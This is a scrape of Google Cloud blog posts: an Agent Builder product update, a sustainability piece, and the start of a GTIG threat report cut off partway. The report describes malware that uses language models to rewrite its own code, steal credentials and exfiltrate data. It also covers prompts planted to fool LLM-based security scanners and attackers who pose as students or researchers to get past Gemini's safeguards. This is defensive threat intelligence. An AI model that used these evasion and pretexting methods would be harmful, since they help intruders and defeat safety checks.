style=\"vertical-align: baseline;\">. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplified access:</strong><span style=\"vertical-align: baseline;\"> You can use the ADK CLI to deploy to the Agent Engine runtime and use </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-engine/overview#express-mode\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AE sessions and memory without signing up for a Google Cloud account</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">Sign up using your Gmail address</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">and get started for free for up to 90 days. If you have a Google Cloud account, </span><span style=\"vertical-align: baseline;\">the AE runtime now offers a </span><a href=\"https://cloud.google.com/vertex-ai/pricing#vertex-ai-agent-engine\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">free tier</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">so you can deploy and experiment without hesitation. </span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Below is a demo showcasing the new observability features in actions such as an updated AE dashboard, traces, and playground within Agent Engine</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_QOneucA.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">3. Govern your AI agents with confidence</span></h3>\n<p><span style=\"vertical-align: baseline;\">Now that you can measure your agent performance at scale the final stage of the lifecycle is ensuring they operate safely and responsibly. New and expanded capabilities include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent identities:</strong><span style=\"vertical-align: baseline;\"> Building on our existing Cloud IAM capabilities, we are giving agents their own unique, </span><strong style=\"vertical-align: baseline;\">native identities</strong><span style=\"vertical-align: baseline;\"> within Google Cloud. As first-class</span> <a href=\"https://cloud.google.com/iam/docs/principals-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IAM principals</span></a><span style=\"vertical-align: baseline;\">, agent identities allow you to enforce true least-privilege access, establish granular policies, and resource boundaries to meet your compliance and governance requirements. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Safeguards and advanced security:</strong><span style=\"vertical-align: baseline;\"> Existing protections are already available to protect and secure AI applications. </span><a href=\"https://docs.cloud.google.com/security-command-center/docs/model-armor-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Model Armor</strong></a><span style=\"vertical-align: baseline;\"> provides protection against input risks like prompt injection, while also screening tool calls and agent responses. For complete control, Model Armor provides built-in inline protection for Gemini models and a REST API to integrate with your agents. To provide full visibility, new integrations with AI Protection in </span><a href=\"https://docs.cloud.google.com/security-command-center/docs\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Security Command Center</strong></a><span style=\"vertical-align: baseline;\"> will discover and inventory agentic assets as well as detect agentic threats such as unauthorized access and data exfiltration attempts by agents.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">As a bonus, agents you build in Agent Builder can be registered for your teams to use directly within </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/introducing-gemini-enterprise?e=48754805?utm_source%3Dlinkedin\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Below is a mock of a dashboard in Gemini Enterprise, showing how custom agents built in Agent Builder can be registered and made available to your employees, creating a single place for them to accelerate their workflows.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nS75AlB.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">How customers are achieving more with Agent Builder</span></h3>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">“Color Health, with its affiliated medical group Color Medical, operates the nation’s only Virtual Cancer Clinic, delivering clinically guided, end-to-end cancer care across all 50 states, from prevention to survivorship. In partnership with Google Cloud and Google.org, we’re helping more women get screened for breast cancer using an AI-powered agent built with </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> using </span><strong style=\"vertical-align: baseline;\">ADK powered by Gemini LLMs </strong><span style=\"vertical-align: baseline;\">and scaling them into production with </span><strong style=\"vertical-align: baseline;\">Agent Engine</strong></em><span style=\"vertical-align: baseline;\"><em>. The Color Assistant determines if women are due for a mammogram, connects them with clinicians, and schedules care. The power of the agent lies in the scale it enables, helping us reach more women, collect diverse and context-rich answers, and respond in real time. Early detection saves lives: 1 in 8 women develop breast cancer, yet early detection yields a 99% survival rate. Check it out here: color.com/breast-cancer-screening” </em></span><span style=\"font-style: italic; vertical-align: baseline;\">- </span><span style=\"vertical-align: baseline;\">Jayodita Sanghvi, PhD., Head of AI Platform, Color</span></p>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">\"PayPal uses </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> to rapidly build and deploy agents in production. Specifically, we use </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK) CLI and visual tools</strong><span style=\"vertical-align: baseline;\"> to inspect </span><strong style=\"vertical-align: baseline;\">agent</strong><span style=\"vertical-align: baseline;\"> interactions, follow state changes, and manage multi-agent workflows. We leverage the </span><strong style=\"vertical-align: baseline;\">step-by-step visibility</strong><span style=\"vertical-align: baseline;\"> feature for </span><strong style=\"vertical-align: baseline;\">tracing and debugging agent workflows. </strong><span style=\"vertical-align: baseline;\">This lets the team easily</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">trace requests/responses and visualize the flow of intent, cart, and payment mandates. Finally, </span><strong style=\"vertical-align: baseline;\">Agent Payment Protocol (AP2)</strong><span style=\"vertical-align: baseline;\"> on Agent Builder provides us the critical foundation for trusted agent payments. </span><strong style=\"vertical-align: baseline;\">AP2</strong></em><span style=\"vertical-align: baseline;\"><em> helps our ecosystem accelerate the shipping of safe, secure agent-based commerce experiences.\"</em> -</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Nitin Sharma, Principal Engineer, AI</span></p>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">“Geotab uses </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> to rapidly build and deploy agents in production. Specifically, we use Google's </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK)</strong></em><span style=\"vertical-align: baseline;\"><em> as the framework for our AI Agent Center of Excellence. It provides the flexibility to orchestrate various frameworks under a single, governable path to production, while offering an exceptional developer experience that dramatically accelerates our build-test-deploy cycle. For Geotab, ADK is the foundation that allows us to rapidly and safely scale our agentic AI solutions across the enterprise”</em> - <span style=\"vertical-align: baseline;\">Mike Branch, Vice President, Data &amp; Analytics</span></span></p>\n<h3><span style=\"vertical-align: baseline;\">Get started</span></h3>\n<p><a href=\"https://cloud.google.com/products/agent-builder?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Agent Builder</span></a><span style=\"vertical-align: baseline;\"> provides the unified platform to manage the entire agent lifecycle, helping you close the gap from prototype to a production-ready agent. To explore these new features, visit the updated </span><a href=\"https://cloud.google.com/agent-builder/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder documentation</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n<p><span style=\"vertical-align: baseline;\">If you’re a startup and you’re interested in learning more about building and deploying agents, download the </span><a href=\"https://goo.gle/3KjHdiW\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Startup Technical Guide: AI Agents</span></a><span style=\"vertical-align: baseline;\">. This guide provides the knowledge needed to go from an idea to prototype to scale, whether your goals are to automate tasks, enhance creativity, or launch entirely new user experiences for your startup.</span></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/sustainability/building-software-sustainably/",
        "title": "Build software sustainably in the AI era",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Build_Software_Sustainably_blog_header.max-600x600.png",
        "author": "John Abel",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Artificial intelligence is reshaping our world – accelerating discovery, optimising systems, and unlocking new possibilities across every sector. But with its vast potential comes a shared responsibility.</span></p>\n<p><span style=\"vertical-align: baseline;\">AI can be a powerful ally for transforming businesses and reducing cost. It can help organizations minimize carbon emissions, industries manage energy use, and scientists model complex climate systems in real time. Yet the way we design, deploy, and run AI also matters. Building software sustainably means making every stage of the digital journey – from architecture to inference – more efficient, transparent, and resilient.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Innovation that serves sustainability</span></h3>\n<p><span style=\"vertical-align: baseline;\">At Google, we believe innovation and sustainability go hand in hand. The same intelligence that powers breakthroughs can also help us use resources more wisely.</span></p>\n<p><span style=\"vertical-align: baseline;\">Projects like </span><strong style=\"vertical-align: baseline;\">Green Light</strong><span style=\"vertical-align: baseline;\">, which uses AI to optimise traffic signals and reduce emissions, and </span><strong style=\"vertical-align: baseline;\">Project Contrails</strong><span style=\"vertical-align: baseline;\">, which helps airlines cut the warming effects of condensation trails, show what happens when technology serves both performance and planet.</span></p>\n<p><span style=\"vertical-align: baseline;\">Each example reveals a helpful truth – that sustainability doesn’t slow innovation but instead fuels it, enabling efficiency to become an engine of progress.</span></p>\n<h3><span style=\"vertical-align: baseline;\">From footprint to framework</span></h3>\n<p><span style=\"vertical-align: baseline;\">Every software system, including AI, has an environmental footprint – from the hardware and energy that powers data centers to the water used to cool them. Water is one of the planet’s most precious and increasingly scarce resources and protecting it must be part of any technology strategy. That’s why Google is investing in advanced cooling systems and </span><strong style=\"vertical-align: baseline;\">water stewardship projects</strong><span style=\"vertical-align: baseline;\"> with the goal to replenish more than we consume, helping preserve local ecosystems and community supplies.</span></p>\n<p><span style=\"vertical-align: baseline;\">Understanding this footprint helps engineers and organisations make smarter choices, like selecting efficient accelerators, rightsizing workloads, and scheduling operations when the grid is cleanest.</span></p>\n<p><span style=\"vertical-align: baseline;\">Across Google Cloud, we’re continually improving efficiency. Our Ironwood Tensor Processing Units (TPUs) are nearly 30 times more energy-efficient than our first Cloud TPU from 2018, and our data centres operate at a fleet-wide Power Usage Effectiveness (PUE) of 1.09, which is amongst the best in the world.</span></p>\n<p><span style=\"vertical-align: baseline;\">By designing systems that consume less energy and run on more carbon-free power, we help close the gap between </span><span style=\"font-style: italic; vertical-align: baseline;\">ambition and action</span><span style=\"vertical-align: baseline;\"> – turning digital progress into tangible emissions reductions.</span></p>\n<p><span style=\"vertical-align: baseline;\">But this isn’t achieved through infrastructure alone. It’s the result of decisions made at every layer of the software lifecycle. That’s why we encourage teams to think </span><span style=\"font-style: italic; vertical-align: baseline;\">Sustainable by Design</span><span style=\"vertical-align: baseline;\">, bringing efficiency, measurement, and responsibility into every stage of building software.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Sustainable by Design: a mindset for the AI era</span></h3>\n<p><span style=\"vertical-align: baseline;\">Today’s sustainability questions aren't coming just from sustainability teams; they are coming directly from executives, financial operations teams, technology leads and developers. And they are often asking sustainability questions using infrastructure language:</span><span style=\"font-style: italic; vertical-align: baseline;\"> \"Are we building the most price-performant AND efficient way to run AI?\"</span><span style=\"vertical-align: baseline;\"> This is not a niche environmental question; it's relevant across -industries, across-geo’s and it requires that leaders consider sustainability criteria when they are designing infrastructure.  </span><span style=\"vertical-align: baseline;\">A Sustainable by Design infrastructure strategy makes AI training and operation dramatically more cost- and energy-efficient. It’s built around a set of principles known as the </span><strong style=\"vertical-align: baseline;\">4Ms</strong><span style=\"vertical-align: baseline;\"> which lay out powerful ways to embed efficiency into software:</span></p>\n<ol>\n<li><strong style=\"vertical-align: baseline;\">Machine </strong><span style=\"vertical-align: baseline;\">- choose efficient computing resources that deliver more performance per watt.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Model </strong><span style=\"vertical-align: baseline;\">- use or adapt existing models rather than starting from scratch — smaller, fine-tuned models can be faster and more resource efficient.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Mechanisation </strong><span style=\"vertical-align: baseline;\">- automate data and AI operations through serverless and managed services to minimise idle compute.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Map </strong><span style=\"vertical-align: baseline;\">- run workloads where and when the energy supply is cleanest.</span></li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">The 4Ms help turn sustainability into a design principle, and a shared responsibility across every role in tech. </span></p>\n<h3><span style=\"vertical-align: baseline;\">A collective journey toward resilience</span></h3>\n<p><span style=\"vertical-align: baseline;\">As we host the AI Days in the Nordics, the conversation about AI’s environmental impact is accelerating, and so is the opportunity to act. Every software team, cloud architect, and product manager has a role to play in designing a digital ecosystem that enables and fuels innovation without compromising environmental impact.</span></p>\n<p><span style=\"vertical-align: baseline;\">Building software sustainably is essential for business resilience –AI applications that use fewer resources are not only more energy efficient; they're scalable, and cost-effective for the organisations that depend on them.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more about how we can make the future sustainable by design, download our </span><a href=\"https://www.gstatic.com/bricks/pdf/c2a8e9ed-01b4-442a-94fe-d084fc8f9bbe/Google%20Cloud%20Build%20Software%20Sustainably%202025.pdf\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Build Software Sustainably ebook</strong></a><strong style=\"vertical-align: baseline;\">.</strong></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools/",
        "title": "GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools",
        "thumbnail": null,
        "author": "Google Threat Intelligence Group",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Executive Summary</span></h3>\n<p><span style=\"vertical-align: baseline;\">Based on recent analysis of the broader threat landscape, Google Threat Intelligence Group (GTIG) has identified a shift that occurred within the last year: adversaries are no longer leveraging artificial intelligence (AI) just for productivity gains, they are deploying </span><strong style=\"vertical-align: baseline;\">novel AI-enabled malware in active operations</strong><span style=\"vertical-align: baseline;\">. This marks a new operational phase of AI abuse, involving tools that dynamically alter behavior mid-execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">This report serves as an update to our January 2025 analysis, \"</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Adversarial Misuse of Generative AI</span></a><span style=\"vertical-align: baseline;\">,\" and details how government-backed threat actors and cyber criminals are integrating and experimenting with AI across the industry throughout the entire attack lifecycle. Our findings are based on the broader threat landscape.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google, we are committed to developing AI responsibly and take proactive steps to disrupt malicious activity by disabling the projects and accounts associated with bad actors, while continuously improving our models to make them less susceptible to misuse. We also proactively share industry best practices to arm defenders and enable stronger protections across the ecosystem. Throughout this report we’ve noted steps we’ve taken to thwart malicious activity, including disabling assets and applying intel to strengthen both our classifiers and model so it’s protected from misuse moving forward. Additional details on how we’re protecting and defending Gemini can be found in this white paper</span><span style=\"vertical-align: baseline;\">, “</span><a href=\"https://deepmind.google/discover/blog/advancing-geminis-security-safeguards/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Advancing Gemini’s Security Safeguards</span></a><span style=\"vertical-align: baseline;\">.” </span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe158e79340&gt;), (&#x27;btn_text&#x27;, &#x27;Download now&#x27;), (&#x27;href&#x27;, &#x27;https://services.google.com/fh/files/misc/advances-in-threat-actor-usage-of-ai-tools-en.pdf&#x27;), (&#x27;image&#x27;, &lt;GAEImage: misuse of AI 2 cover&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 key\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-key.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Key Findings</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">First Use of \"Just-in-Time\" AI in Malware:</strong><span style=\"vertical-align: baseline;\"> For the first time, GTIG has identified malware families, such as </span><strong style=\"vertical-align: baseline;\">PROMPTFLUX</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">PROMPTSTEAL</strong><span style=\"vertical-align: baseline;\">, that use Large Language Models (LLMs) during execution. These tools dynamically generate malicious scripts, obfuscate their own code to evade detection, and leverage AI models to create malicious functions on demand, rather than hard-coding them into the malware. While still nascent, this represents a significant step toward more autonomous and adaptive malware.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">\"Social Engineering\" to Bypass Safeguards:</strong><span style=\"vertical-align: baseline;\"> Threat actors are adopting social engineering-like pretexts in their prompts to bypass AI safety guardrails. We observed actors posing as students in a \"capture-the-flag\" competition or as cybersecurity researchers to persuade Gemini to provide information that would otherwise be blocked, enabling tool development.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Maturing Cyber Crime Marketplace for AI Tooling:</strong><span style=\"vertical-align: baseline;\"> The underground marketplace for illicit AI tools has matured in 2025. We have identified multiple offerings of multifunctional tools designed to support phishing, malware development, and vulnerability research, lowering the barrier to entry for less sophisticated actors.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Continued Augmentation of the Full Attack Lifecycle:</strong><span style=\"vertical-align: baseline;\"> State-sponsored actors including from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse Gemini to enhance all stages of their operations, from reconnaissance and phishing lure creation to command and control (C2) development and data exfiltration.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Threat Actors Developing Novel AI Capabilities </span></h3>\n<p><span style=\"vertical-align: baseline;\">For the first time in 2025, GTIG discovered a code family that employed AI capabilities mid-execution to dynamically alter the malware’s behavior. Although some recent implementations of novel AI techniques are experimental, they provide an early indicator of how threats are evolving and how they can potentially integrate AI capabilities into future intrusion activity. Attackers are moving beyond \"vibe coding\" and the baseline observed in 2024 of using AI tools for technical support. We are only now starting to see this type of activity, but expect it to increase in the future.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Malware</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Function</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Status</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/f8f5e0440c57c7deffd75ca33e2511867039796aa803e7ef847396a379188a7d\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">FRUITSHELL</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reverse Shell</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Publicly available reverse shell written in PowerShell that establishes a remote connection to a configured command-and-control server and allows a threat actor to execute arbitrary commands on a compromised system. Notably, this code family contains hard-coded prompts meant to bypass detection or analysis by LLM-powered security systems.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/eb0687daed29f3651c61b0a2aa4a0cdcf2049a1ebae2e15e2dd9326471d318a1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTFLUX</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Dropper</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Dropper written in VBScript that decodes and executes an embedded decoy installer to mask its activity. Its primary capability is regeneration, which it achieves by using the Google Gemini API. It prompts the LLM to rewrite its own source code, saving the new, obfuscated version to the Startup folder to establish persistence. PROMPTFLUX also attempts to spread by copying itself to removable drives and mapped network shares.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Experimental</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/e24fe0dd0bf8d3943d9c4282f172746af6b0787539b371e6626bdb86605ccd70\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTLOCK</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ransomware</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Cross-platform ransomware written in Go, identified as a proof of concept. It leverages an LLM to dynamically generate and execute malicious Lua scripts at runtime. Its capabilities include filesystem reconnaissance, data exfiltration, and file encryption on both Windows and Linux systems.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Experimental</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/766c356d6a4b00078a0293460c5967764fcd788da8c1cd1df708695f3a15b777\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTSTEAL</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data Miner</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data miner written in Python and packaged with PyInstaller. It contains a compiled script that uses the Hugging Face API to query the LLM Qwen2.5-Coder-32B-Instruct to generate one-line Windows commands. Prompts used to generate the commands indicate that it aims to collect system information and documents in specific folders. PROMPTSTEAL then executes the commands and sends the collected data to an adversary-controlled server.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/8eea1f65e468b515020e3e2854805f1ef5c611342fa23c4b31d8ed3374286a90\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">QUIETVAULT</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Stealer</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential stealer written in JavaScript that targets GitHub and NPM tokens. Captured credentials are exfiltrated via creation of a publicly accessible GitHub repository. In addition to these tokens, QUIETVAULT leverages an AI prompt and on-host installed AI CLI tools to search for other potential secrets on the infected system and exfiltrate these files to GitHub as well.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\" style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: Overview of malware with novel AI capabilities GTIG detected in 2025</span></div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Experimental Malware Using Gemini for Self-Modification to Evade Detection</span></h4>\n<p><span style=\"vertical-align: baseline;\">In early June 2025, GTIG identified experimental dropper malware tracked as PROMPTFLUX that suggests threat actors are experimenting with LLMs to develop dynamic obfuscation techniques. PROMPTFLUX is written in VBScript and interacts with Gemini's API to request specific VBScript obfuscation and evasion techniques to facilitate \"just-in-time\" self-modification, likely to evade static signature-based detection.</span></p>\n<p><span style=\"vertical-align: baseline;\">Further examination of PROMPTFLUX samples suggests this code family is currently in a development or testing phase since some incomplete features are commented out and a mechanism exists to limit the malware's Gemini API calls. The current state of this malware does not demonstrate an ability to compromise a victim network or device. We have taken action to disable the assets</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">associated with this activity. </span></p>\n<p><span style=\"vertical-align: baseline;\">The most novel component of PROMPTFLUX is its \"Thinking Robot\" module, designed to periodically query Gemini to obtain new code for evading antivirus software. This is accomplished using a hard-coded API key to send a POST request to the Gemini API endpoint. The actor specifies the use of the \"</span><code style=\"vertical-align: baseline;\">gemini-1.5-flash-latest</code><span style=\"vertical-align: baseline;\">\" model; the \"</span><code style=\"vertical-align: baseline;\">-latest</code><span style=\"vertical-align: baseline;\">\" tag ensures the malware always calls the most current stable release, making the tool more resilient to model deprecation. The prompt sent to the LLM is highly specific and machine-parsable, requesting VBScript code for antivirus evasion and instructing the LLM to output only the code itself. </span></p>\n<p><span style=\"vertical-align: baseline;\">Although the self-modification function (</span><code style=\"vertical-align: 